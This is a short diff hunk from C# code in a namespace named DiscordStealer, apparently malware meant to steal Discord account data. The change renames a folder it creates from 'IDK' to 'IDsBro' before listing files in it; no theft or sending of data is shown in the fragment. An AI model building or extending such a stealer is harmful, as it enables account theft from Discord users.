@@ -59,7 +59,7 @@ namespace DiscordStealer
 											{
 												try
 												{
-													Directory.CreateDirectory(text4 + "\\IDK");
+													Directory.CreateDirectory(text4 + "\\IDsBro");
 												}
 												catch { }
 												foreach (string text5 in Directory.GetFiles(text4))
